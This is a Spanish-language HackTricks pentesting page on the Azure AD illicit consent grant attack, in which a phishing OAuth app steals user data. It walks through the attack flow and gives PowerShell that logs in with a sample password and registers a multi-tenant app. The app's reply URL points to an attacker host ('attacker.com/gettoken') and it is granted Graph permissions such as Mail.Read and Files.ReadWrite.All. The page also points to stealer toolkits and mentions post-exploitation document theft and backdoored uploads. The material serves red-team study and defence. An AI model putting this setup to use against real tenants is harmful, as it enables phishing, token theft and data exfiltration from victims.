# Az - Concesión de Consentimiento Ilícito

<details>

<summary><strong>¡Apoya a HackTricks y obtén beneficios!</strong></summary>

* Si deseas ver a tu **empresa anunciada en HackTricks** o si deseas acceder a la **última versión de PEASS o descargar HackTricks en PDF**, ¡consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>

## Phishing de Aplicación OAuth

Las **aplicaciones de Azure** solicitan permisos para acceder a los **datos del usuario** (información básica, pero también acceso a documentos, envío de correos electrónicos...).\
Si se **permite**, un usuario normal solo puede otorgar consentimiento para **"Permisos de bajo impacto"**. En **todos los demás** casos, se requiere **consentimiento de administrador**.\
`GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` y un rol personalizado que incluya `permiso para otorgar permisos a aplicaciones` pueden proporcionar consentimiento a nivel de inquilino.

Solo los permisos que **no requieren consentimiento de administrador** se clasifican como de **bajo impacto**. Estos son los permisos necesarios para **la autenticación básica son openid, profile, email, User.Read y offline\_access**. Si una **organización** **permite** el consentimiento del usuario para **todas las aplicaciones**, un empleado puede otorgar consentimiento a una aplicación para **leer lo anterior de su perfil**.

<figure><img src="../../../.gitbook/assets/image (3) (2) (1).png" alt=""><figcaption></figcaption></figure>

Por lo tanto, un atacante podría preparar una **aplicación maliciosa** y con un **phishing**, hacer que el usuario **acepte la aplicación y robe sus datos**.

### Verificar si los usuarios pueden otorgar consentimiento

Verifique si los usuarios pueden otorgar consentimiento a las aplicaciones:

{% code overflow="wrap" %}
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
{% endcode %}

* **Desactivar el consentimiento del usuario**: los usuarios no pueden otorgar permisos a las aplicaciones.
* **Los usuarios pueden dar su consentimiento a aplicaciones de editores verificados o de su organización, pero solo para los permisos que seleccione**: todos los usuarios solo pueden dar su consentimiento a aplicaciones publicadas por un editor verificado y aplicaciones registradas en su inquilino.
* **Los usuarios pueden dar su consentimiento a todas las aplicaciones**: permite que todos los usuarios den su consentimiento a cualquier permiso que no requiera el consentimiento del administrador.
* **Política de consentimiento de aplicaciones personalizada**

## **¿Qué es un ataque de concesión de consentimiento ilícito?**

En un ataque de concesión de consentimiento ilícito, el atacante crea una **aplicación registrada en Azure que solicita acceso a datos como información de contacto, correo electrónico o documentos**. El atacante luego engaña a un usuario final para que otorgue su consentimiento a la aplicación para que el atacante pueda acceder a los datos a los que el usuario objetivo tiene acceso. Después de que se haya otorgado el consentimiento a la aplicación, esta tiene acceso a nivel de cuenta de usuario a los datos sin necesidad de una cuenta organizativa.

En palabras simples, cuando la víctima hace clic en ese hermoso botón azul de "Aceptar", Azure AD envía un token al sitio de terceros que pertenece a un atacante donde el atacante usará el token para realizar acciones en nombre de las víctimas, como acceder a todos los archivos, leer correos electrónicos, enviar correos electrónicos, etc.

## **Flujo del ataque**

<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

Para realizar este ataque contra la empresa "ecorp", el atacante podría registrar un dominio con el nombre "safedomainlogin.com" y crear un subdominio ["ecorp.safedomainlogin.com"](http://ecorp.safedomainlogin.com/) donde **alojó la aplicación para capturar el código de autorización** y luego solicitar los tokens de acceso.

Luego, registra una aplicación de varios inquilinos en su inquilino de Azure AD y la nombra como "ecorp" y agrega la URL de redireccionamiento que apunta a "ecorp.safedomainlogin.com" que aloja una aplicación para capturar el código de autorización.

El atacante también crea un nuevo secreto de cliente y agrega algunos **permisos** de API como `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read` en la aplicación. Para que una vez que el **usuario otorgue el consentimiento a la aplicación**, el atacante pueda **extraer** la **información sensible** en nombre del usuario.

Finalmente, el atacante crea el **enlace** que contenía el ID de cliente de la aplicación maliciosa y **comparte** el enlace con los **usuarios objetivo** para obtener su consentimiento.

## 365-Stealer

Puede realizar este ataque con [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer).

Como paso adicional, si tiene algún **acceso sobre un usuario en la organización víctima**, puede verificar si la política le permitirá **aceptar aplicaciones**:
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# If "ManagePermissionGrantsForSelf.microsoft-user-default-legacy", he can
```
Para este ataque, deberás crear una **nueva aplicación en tu inquilino de Azure** (en Registros de aplicaciones) con, por ejemplo, los siguientes permisos:

<figure><img src="../../../.gitbook/assets/image (2) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All` está dentro de `Microsoft Graph` en `Permisos delegados`. (Los permisos de aplicación siempre necesitarán aprobación adicional).

* `User.ReadBasic.All` es el permiso que te permitirá **leer información de todos los usuarios** en la organización si se concede.
* Recuerda que solo los roles `GA`, `Administrador de aplicaciones`, `Administrador de aplicaciones en la nube` y un rol personalizado que incluya `permiso para otorgar permisos a aplicaciones` pueden proporcionar el consentimiento de la organización. Por lo tanto, deberás **phishing a un usuario con uno de esos roles** si deseas que apruebe una **aplicación que requiere el consentimiento del administrador**.

También puedes crear una aplicación a través de la CLI con:

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
  $AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
  $AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

  $Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
  $Access.Type = "Scope"
  $Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
  $AADAccess.ResourceAccess = @()
  $AADAccess.ResourceAccess.Add($Access)

  $Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
  $Access2.Type = "Scope"
  $Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
  $AADAccess.ResourceAccess.Add($Access2)

  $Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
  $Access3.Type = "Scope"
  $Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
  $AADAccess.ResourceAccess.Add($Access3)

  $Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
  $Access4.Type = "Scope"
  $Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
  $AADAccess.ResourceAccess.Add($Access4)

  $app.RequiredResourceAccess.Add($AADAccess)
} else {
  $Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
  $Access.Type = "Scope"
  $Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
  $AADAccess.ResourceAccess = @()
  $AADAccess.ResourceAccess.Add($Access)

  $Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
  $Access2.Type = "Scope"
  $Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
  $AADAccess.ResourceAccess.Add($Access2)

  $Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
  $Access3.Type = "Scope"
  $Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
  $AADAccess.ResourceAccess.Add($Access3)

  $Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
  $Access4.Type = "Scope"
  $Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
  $AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

Revisa [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) para aprender cómo configurarlo.

{% hint style="warning" %}
Ten en cuenta que el **token de acceso** obtenido será para el **endpoint de graph** con los ámbitos: `User.Read` y `User.ReadBasic.All` (los permisos solicitados). No podrás realizar otras acciones (pero eso es suficiente para **descargar información sobre todos los usuarios** en la organización).
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

También puedes usar esta herramienta para realizar este ataque.

## Post-Explotación

Una vez que tengas acceso al usuario, puedes hacer cosas como robar documentos sensibles e incluso subir archivos de documentos con puertas traseras.

## Referencias

* Este post fue copiado de [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)

<details>

<summary><strong>¡Apoya a HackTricks y obtén beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **última versión de PEASS o descargar HackTricks en PDF** ¡Revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
